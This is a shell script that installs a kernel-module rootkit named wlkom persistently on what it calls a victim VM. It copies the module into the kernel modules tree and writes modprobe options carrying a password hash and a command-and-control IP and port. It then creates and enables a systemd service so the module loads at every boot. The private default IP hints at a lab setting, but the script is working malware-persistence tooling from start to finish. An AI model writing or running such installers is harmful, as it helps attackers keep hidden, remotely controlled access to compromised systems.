#!/bin/sh
# Install wlkom.ko persistently on the victim VM.
# Usage: sudo ./install_persistence.sh [c2_ip] [c2_port]

set -eu

usage() {
    echo "Usage: sudo $0 [c2_ip] [c2_port]" >&2
    echo "Example: sudo $0 192.168.100.10 4444" >&2
}

if [ "${1:-}" = "-h" ] || [ "${1:-}" = "--help" ]; then
    usage
    exit 0
fi

if [ "$(id -u)" -ne 0 ]; then
    echo "This installer must run as root." >&2
    exit 1
fi

C2_IP="${1:-192.168.100.10}"
C2_PORT="${2:-4444}"
KERNEL_VERSION="$(uname -r)"
MODULE_SRC="./wlkom.ko"
MODULE_DST_DIR="/lib/modules/$KERNEL_VERSION/extra"
MODULE_DST="$MODULE_DST_DIR/wlkom.ko"
MODPROBE_CONF="/etc/modprobe.d/wlkom.conf"
SERVICE_FILE="/etc/systemd/system/wlkom.service"

if [ ! -f "$MODULE_SRC" ]; then
    echo "Missing $MODULE_SRC. Run make in the rootkit directory first." >&2
    exit 1
fi

printf "WLKOM password: " >&2
stty -echo
IFS= read -r PASSWORD
stty echo
printf "\n" >&2

if [ -z "$PASSWORD" ]; then
    echo "Password must not be empty." >&2
    exit 1
fi

PASSWORD_HASH="$(PASSWORD="$PASSWORD" python3 - <<'HASH_PY'
import os

value = 2166136261
for byte in os.environ["PASSWORD"].encode():
    value ^= byte
    value = (value * 16777619) & 0xffffffff
print(f"{value:08x}")
HASH_PY
)"
unset PASSWORD

install -d "$MODULE_DST_DIR"
install -m 0644 "$MODULE_SRC" "$MODULE_DST"
depmod -a

cat > "$MODPROBE_CONF" <<EOF
options wlkom password_hash=$PASSWORD_HASH c2_ip=$C2_IP c2_port=$C2_PORT
EOF

cat > "$SERVICE_FILE" <<'EOF'
[Unit]
Description=WLKOM kernel module
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/sbin/modprobe wlkom
ExecStop=/sbin/modprobe -r wlkom
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable wlkom.service

echo "WLKOM persistence installed for kernel $KERNEL_VERSION."
echo "Module: $MODULE_DST"
echo "Config: $MODPROBE_CONF"
echo "Service: $SERVICE_FILE"
echo "Stored password_hash: $PASSWORD_HASH"
echo "Start now with: sudo systemctl start wlkom.service"
